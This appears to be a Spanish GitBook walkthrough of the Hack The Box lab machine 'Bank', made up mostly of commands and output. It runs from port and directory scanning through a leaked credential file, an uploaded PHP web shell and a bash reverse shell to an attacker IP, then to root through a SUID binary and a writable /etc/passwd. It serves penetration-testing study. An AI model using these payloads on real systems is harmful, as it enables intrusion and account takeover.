---
icon: desktop
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Bank

`Bank` es una máquina relativamente simple, sin embargo, una enumeración web adecuada es clave para encontrar los datos necesarios para la entrada. También existe un método de entrada no deseado, que muchos usuarios descubren antes de encontrar los datos correctos.

<figure><img src="../../.gitbook/assets/Bank.png" alt="" width="563"><figcaption></figcaption></figure>

***

## Reconnaissance



```bash
❯ nmap -p- --open -sS --min-rate 1000 -vvv -Pn -n 10.10.10.29 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-16 21:47 CET
Initiating SYN Stealth Scan at 21:47
Scanning 10.10.10.29 [65535 ports]
Discovered open port 53/tcp on 10.10.10.29
Discovered open port 22/tcp on 10.10.10.29
Discovered open port 80/tcp on 10.10.10.29
Completed SYN Stealth Scan at 21:47, 12.53s elapsed (65535 total ports)
Nmap scan report for 10.10.10.29
Host is up, received user-set (0.035s latency).
Scanned at 2025-02-16 21:47:10 CET for 13s
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
53/tcp open  domain  syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 12.63 seconds
           Raw packets sent: 65535 (2.884MB) | Rcvd: 65541 (2.622MB)
```



```bash
❯ extractPorts allPorts

[*] Extracting information...

	[*] IP Address: 10.10.10.29
	[*] Open ports: 22,53,80

[*] Ports copied to clipboard
```



```bash
❯ nmap -sCV -p22,53,80 10.10.10.29 -A -oN targeted -oX targetedXML
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-16 21:48 CET
Nmap scan report for bank.htb (10.10.10.29)
Host is up (0.071s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 08:ee:d0:30:d5:45:e4:59:db:4d:54:a8:dc:5c:ef:15 (DSA)
|   2048 b8:e0:15:48:2d:0d:f0:f1:73:33:b7:81:64:08:4a:91 (RSA)
|   256 a0:4c:94:d1:7b:6e:a8:fd:07:fe:11:eb:88:d5:16:65 (ECDSA)
|_  256 2d:79:44:30:c8:bb:5e:8f:07:cf:5b:72:ef:a1:6d:67 (ED25519)
53/tcp open  domain  ISC BIND 9.9.5-3ubuntu0.14 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.9.5-3ubuntu0.14-Ubuntu
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
| http-title: HTB Bank - Login
|_Requested resource was login.php
|_http-server-header: Apache/2.4.7 (Ubuntu)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.10 - 4.11, Linux 3.2 - 4.14
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 22/tcp)
HOP RTT      ADDRESS
1   66.51 ms 10.10.16.1
2   32.33 ms bank.htb (10.10.10.29)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.64 seconds
```



```bash
❯ xsltproc targetedXML > index.html

❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```



<figure><img src="../../.gitbook/assets/5017_vmware_cKCrYqAksQ.png" alt=""><figcaption></figcaption></figure>



```bash

❯ whatweb http://10.10.10.29
http://10.10.10.29 [200 OK] Apache[2.4.7], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.7 (Ubuntu)], IP[10.10.10.29], Title[Apache2 Ubuntu Default Page: It works]
```

<figure><img src="../../.gitbook/assets/imagen (23).png" alt=""><figcaption></figcaption></figure>



```bash
❯ feroxbuster -u http://10.10.10.29 -t 200 -C 500,502
                                                                                                                                                                                                                                      
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.10.29
 🚀  Threads               │ 200
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 💢  Status Code Filters   │ [500, 502]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.11.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
403      GET       10l       30w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
404      GET        9l       32w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET       14l       74w     6216c http://10.10.10.29/icons/ubuntu-logo.png
200      GET      378l      980w    11510c http://10.10.10.29/
404      GET        9l       33w      285c http://10.10.10.29/Donate%20Cash
404      GET        9l       33w      285c http://10.10.10.29/Site%20Assets
[#################>--] - 14s    26939/30007   2s      found:4       errors:91     
[#################>--] - 14s    26921/30002   1886/s  http://10.10.10.29/                                      [##################>-] - 14s    27120/30007   2s      found:4       errors:91     
[##################>-] - 14s    27105/30002   1892/s  http://10.10.10.29/                                      [##################>-] - 14s    27331/30007   2s      found:4       errors:91     
[##################>-] - 14s    27304/30002   1900/s  http://10.10.10.29/                                      [####################] - 20s    30007/30007   0s      found:4       errors:91     
[####################] - 20s    30002/30002   1491/s  http://10.10.10.29/      
```



```bash
❯ cat /etc/hosts | grep bank
10.10.10.29 bank.htb 
```







```bash
❯ dig A @10.10.10.29 bank.htb

; <<>> DiG 9.20.4-4-Debian <<>> A @10.10.10.29 bank.htb
; (1 server found)
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 7069
;; flags: qr aa rd; QUERY: 1, ANSWER: 1, AUTHORITY: 1, ADDITIONAL: 2
;; WARNING: recursion requested but not available

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4096
;; QUESTION SECTION:
;bank.htb.			IN	A

;; ANSWER SECTION:
bank.htb.		604800	IN	A	10.10.10.29

;; AUTHORITY SECTION:
bank.htb.		604800	IN	NS	ns.bank.htb.

;; ADDITIONAL SECTION:
ns.bank.htb.		604800	IN	A	10.10.10.29

;; Query time: 31 msec
;; SERVER: 10.10.10.29#53(10.10.10.29) (UDP)
;; WHEN: Sun Feb 16 21:51:35 CET 2025
;; MSG SIZE  rcvd: 86
```



```bash
❯ dig AAAA @10.10.10.29 bank.htb

; <<>> DiG 9.20.4-4-Debian <<>> AAAA @10.10.10.29 bank.htb
; (1 server found)
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 58762
;; flags: qr aa rd; QUERY: 1, ANSWER: 0, AUTHORITY: 1, ADDITIONAL: 1
;; WARNING: recursion requested but not available

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4096
;; QUESTION SECTION:
;bank.htb.			IN	AAAA

;; AUTHORITY SECTION:
bank.htb.		604800	IN	SOA	bank.htb. chris.bank.htb. 5 604800 86400 2419200 604800

;; Query time: 32 msec
;; SERVER: 10.10.10.29#53(10.10.10.29) (UDP)
;; WHEN: Sun Feb 16 21:52:06 CET 2025
;; MSG SIZE  rcvd: 79
```



```bash
❯ dig any bank.htb @10.10.10.29

; <<>> DiG 9.20.4-4-Debian <<>> any bank.htb @10.10.10.29
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 19558
;; flags: qr aa rd; QUERY: 1, ANSWER: 3, AUTHORITY: 0, ADDITIONAL: 2
;; WARNING: recursion requested but not available

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4096
;; QUESTION SECTION:
;bank.htb.			IN	ANY

;; ANSWER SECTION:
bank.htb.		604800	IN	SOA	bank.htb. chris.bank.htb. 5 604800 86400 2419200 604800
bank.htb.		604800	IN	NS	ns.bank.htb.
bank.htb.		604800	IN	A	10.10.10.29

;; ADDITIONAL SECTION:
ns.bank.htb.		604800	IN	A	10.10.10.29

;; Query time: 199 msec
;; SERVER: 10.10.10.29#53(10.10.10.29) (TCP)
;; WHEN: Sun Feb 16 21:52:58 CET 2025
;; MSG SIZE  rcvd: 128
```



```bash
❯ dig axfr bank.htb@10.10.10.29

; <<>> DiG 9.20.4-4-Debian <<>> axfr bank.htb@10.10.10.29
;; global options: +cmd
; Transfer failed.
```



```bash
❯ whatweb http://bank.htb
http://bank.htb [302 Found] Apache[2.4.7], Bootstrap, Cookies[HTBBankAuth], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.7 (Ubuntu)], IP[10.10.10.29], JQuery, PHP[5.5.9-1ubuntu4.21], RedirectLocation[login.php], Script, X-Powered-By[PHP/5.5.9-1ubuntu4.21]
http://bank.htb/login.php [200 OK] Apache[2.4.7], Bootstrap, Cookies[HTBBankAuth], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.7 (Ubuntu)], IP[10.10.10.29], JQuery, PHP[5.5.9-1ubuntu4.21], PasswordField[inputPassword], Script, Title[HTB Bank - Login], X-Powered-By[PHP/5.5.9-1ubuntu4.21]
```



<figure><img src="../../.gitbook/assets/imagen (1) (1) (1).png" alt=""><figcaption></figcaption></figure>



```bash
❯ feroxbuster -u http://bank.htb/ -t 200 -C 500,502,404
                                                                                                               
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://bank.htb/
 🚀  Threads               │ 200
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 💢  Status Code Filters   │ [500, 502, 404]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.11.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        9l       32w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
403      GET       10l       30w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
301      GET        9l       28w      301c http://bank.htb/inc => http://bank.htb/inc/
301      GET        9l       28w      304c http://bank.htb/assets => http://bank.htb/assets/
301      GET        9l       28w      305c http://bank.htb/uploads => http://bank.htb/uploads/
200      GET        1l      287w    16994c http://bank.htb/assets/js/sweetalert.min.js
200      GET        7l      432w    37045c http://bank.htb/assets/js/bootstrap.min.js
200      GET        0l        0w        0c http://bank.htb/inc/user.php
200      GET       23l       38w      622c http://bank.htb/inc/footer.php
200      GET       29l      182w    14288c http://bank.htb/assets/img/Thumbs.db
200      GET       48l       93w     1024c http://bank.htb/assets/css/login.css
200      GET       13l       53w     5927c http://bank.htb/assets/img/htb-logo.png
200      GET        4l     1412w    95785c http://bank.htb/assets/js/jquery.js
302      GET      188l      319w     7322c http://bank.htb/ => login.php
200      GET     2377l     6406w    69707c http://bank.htb/assets/js/bootstrap.js
200      GET      935l     2309w    22957c http://bank.htb/assets/css/sweetalert.css
200      GET      106l      587w    35387c http://bank.htb/assets/fonts/glyphicons-halflings-regular.eot
200      GET     1672l     2840w    26651c http://bank.htb/assets/font-awesome/css/font-awesome.css
200      GET        4l       56w    21984c http://bank.htb/assets/font-awesome/css/font-awesome.min.css
200      GET     6757l    16077w   146010c http://bank.htb/assets/css/bootstrap.css
200      GET      288l    13959w   108738c http://bank.htb/assets/fonts/glyphicons-halflings-regular.svg
200      GET     1673l     3210w   162920c http://bank.htb/assets/font-awesome/fonts/FontAwesome.otf
200      GET      520l    42211w   287007c http://bank.htb/assets/font-awesome/fonts/fontawesome-webfont.svg
302      GET        0l        0w        0c http://bank.htb/inc/header.php => login.php
200      GET        0l        0w        0c http://bank.htb/inc/ticket.php
200      GET      227l      378w     3480c http://bank.htb/assets/css/htb-bank.css
200      GET       16l       42w      332c http://bank.htb/assets/font-awesome/scss/_bordered-pulled.scss
200      GET       19l       44w      378c http://bank.htb/assets/font-awesome/scss/_list.scss
200      GET       14l       34w      695c http://bank.htb/assets/font-awesome/scss/_path.scss
200      GET       20l       59w      672c http://bank.htb/assets/font-awesome/scss/_rotated-flipped.scss
200      GET      561l     1133w    15592c http://bank.htb/assets/font-awesome/scss/_variables.scss
200      GET      552l     2489w    35004c http://bank.htb/assets/font-awesome/scss/_icons.scss
200      GET      227l     1523w   117910c http://bank.htb/assets/font-awesome/fonts/fontawesome-webfont.woff
200      GET      233l     1412w    99659c http://bank.htb/assets/font-awesome/fonts/fontawesome-webfont.eot
200      GET     1063l     4200w   142944c http://bank.htb/assets/font-awesome/fonts/fontawesome-webfont.ttf
200      GET       11l       47w      419c http://bank.htb/assets/font-awesome/scss/_core.scss
301      GET        9l       28w      313c http://bank.htb/assets/js/theme => http://bank.htb/assets/js/theme/
```



```bash
❯ gobuster dir -u http://bank.htb/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 200 -b 503,404
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://bank.htb/
[+] Method:                  GET
[+] Threads:                 200
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404,503
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/assets               (Status: 301) [Size: 304] [--> http://bank.htb/assets/]
/inc                  (Status: 301) [Size: 301] [--> http://bank.htb/inc/]
/uploads              (Status: 301) [Size: 305] [--> http://bank.htb/uploads/]
/server-status        (Status: 403) [Size: 288]
/balance-transfer     (Status: 301) [Size: 314] [--> http://bank.htb/balance-transfer/]
Progress: 220547 / 220548 (100.00%)
===============================================================
Finished
===============================================================
```



<figure><img src="../../.gitbook/assets/imagen (385).png" alt=""><figcaption></figcaption></figure>



```bash
❯ curl -s -X GET 'http://bank.htb/balance-transfer/0a0b2b566c723fce6c5dc9544d426688.acc'
++OK ENCRYPT SUCCESS
+=================+
| HTB Bank Report |
+=================+

===UserAccount===
Full Name: czeCv3jWYYljNI2mTedDWxNCF37ddRuqrJ2WNlTLje47X7tRlHvifiVUm27AUC0ll2i9ocUIqZPo6jfs0KLf3H9qJh0ET00f3josvjaWiZkpjARjkDyokIO3ZOITPI9T
Email: 1xlwRvs9vMzOmq8H3G5npUroI9iySrrTZNpQiS0OFzD20LK4rPsRJTfs3y1VZsPYffOy7PnMo0PoLzsdpU49OkCSSDOR6DPmSEUZtiMSiCg3bJgAElKsFmlxZ9p5MfrE
Password: TmEnErfX3w0fghQUCAniWIQWRf1DutioQWMvo2srytHOKxJn76G4Ow0GM2jgvCFmzrRXtkp2N6RyDAWLGCPv9PbVRvbn7RKGjBENW3PJaHiOhezYRpt0fEV797uhZfXi
CreditCards: 5
Transactions: 93
Balance: 905948 .
===UserAccount===
```



<figure><img src="../../.gitbook/assets/5021_vmware_VIMP806xIJ.png" alt=""><figcaption></figcaption></figure>



```bash
❯ curl -s -X GET 'http://bank.htb/balance-transfer/68576f20e9732f1b2edc4df5b8533230.acc'
--ERR ENCRYPT FAILED
+=================+
| HTB Bank Report |
+=================+

===UserAccount===
Full Name: Christos Christopoulos
Email: chris@bank.htb
Password: !##HTBB4nkP4ssw0rd!##
CreditCards: 5
Transactions: 39
Balance: 8842803 .
===UserAccount===
```



```bash
❯ curl -s -X GET 'http://bank.htb/balance-transfer/' | html2text | awk '{print $3, $5}' | paste -d ' ' - - | grep -vE '582|583|584|585' | sort
   
  Server bank.htb
09ed7588d1cd47ffca297cc7dac22c52.acc 581  
68576f20e9732f1b2edc4df5b8533230.acc 257  
941e55bed0cb8052e7015e7133a5b9c7.acc 581  
Directory -  
of ****** Last Description
```





<figure><img src="../../.gitbook/assets/5022_vmware_50zEEsh1dT.png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/imagen (386).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/imagen (387).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/imagen (388).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/imagen (391).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/imagen (392).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/imagen (393).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/imagen (389).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/imagen (390).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/imagen (394).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/imagen (395).png" alt=""><figcaption></figcaption></figure>



```bash
❯ curl -s 'http://bank.htb/uploads/gzzcoo.htb?cmd=id'
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```



```bash
❯ nc -nlvp 443
listening on [any] 443 ...
```







```bash
❯ echo -n 'bash -c "bash -i >& /dev/tcp/10.10.16.3/443 0>&1"' | jq -sRr @uri
bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.16.3%2F443%200%3E%261%22

❯ curl -s 'http://bank.htb/uploads/gzzcoo.htb?cmd=bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.16.3%2F443%200%3E%261%22'
```



```bash
❯ echo -n 'bash -c "bash -i >& /dev/tcp/10.10.16.3/443 0>&1"' | jq -sRr @uri
bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.16.3%2F443%200%3E%261%22
```



```bash
❯ nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.16.3] from (UNKNOWN) [10.10.10.29] 60798
bash: cannot set terminal process group (1073): Inappropriate ioctl for device
bash: no job control in this shell
www-data@bank:/var/www/bank/uploads$ cat /home/chris/user.txt
ab47a4cf55313c450700b1a3aa9f7be2
```



```bash
www-data@bank:/var/www/bank/uploads$ script /dev/null -c bash
script /dev/null -c bash
www-data@bank:/var/www/bank/uploads$ ^Z
zsh: suspended  nc -nlvp 443
❯ stty raw -echo;fg
[1]  + continued  nc -nlvp 443
                                reset xterm
www-data@bank:/var/www/bank/uploads$ export TERM=xterm
www-data@bank:/var/www/bank/uploads$ export SHELL=bash
www-data@bank:/var/www/bank/uploads$ stty rows 46 columns 230
```



```bash
www-data@bank:/var/www/bank/uploads$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@bank:/var/www/bank/uploads$ sudo -l
[sudo] password for www-data: 
www-data@bank:/var/www/bank/uploads$ find / -perm -4000 2>/dev/null
/var/htb/bin/emergency
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/bin/at
/usr/bin/chsh
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/pkexec
/usr/bin/newgrp
/usr/bin/traceroute6.iputils
/usr/bin/gpasswd
/usr/bin/sudo
/usr/bin/mtr
/usr/sbin/uuidd
/usr/sbin/pppd
/bin/ping
/bin/ping6
/bin/su
/bin/fusermount
/bin/mount
/bin/umount
```



```bash
www-data@bank:/var/www/bank/uploads$ ls -l /var/htb/bin/emergency
-rwsr-xr-x 1 root root 112204 Jun 14  2017 /var/htb/bin/emergency
```



```bash
www-data@bank:/var/www/bank/uploads$ /var/htb/bin/emergency
# whoami
root
# cat /root/root.txt
66b882036c79fc18eca7cf84e741a79d
```



```bash
www-data@bank:/tmp$ find /etc -writable 2>/dev/null
/etc/passwd
```





```bash
www-data@bank:/tmp$ openssl passwd -1 gzzcoo
$1$eb5EWdLO$tyxkHG/AFdZsl8iK62EQu/
www-data@bank:/tmp$ cat /etc/passwd | grep root
root:x:0:0:root:/root:/bin/bash
```



```bash
www-data@bank:/tmp$ cat /etc/passwd
root:$1$eb5EWdLO$tyxkHG/AFdZsl8iK62EQu/:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
```



```bash
www-data@bank:/tmp$ su root
Password: 
root@bank:/tmp# whoami
root
root@bank:/tmp# cat /root/root.txt 
66b882036c79fc18eca7cf84e741a79d
```
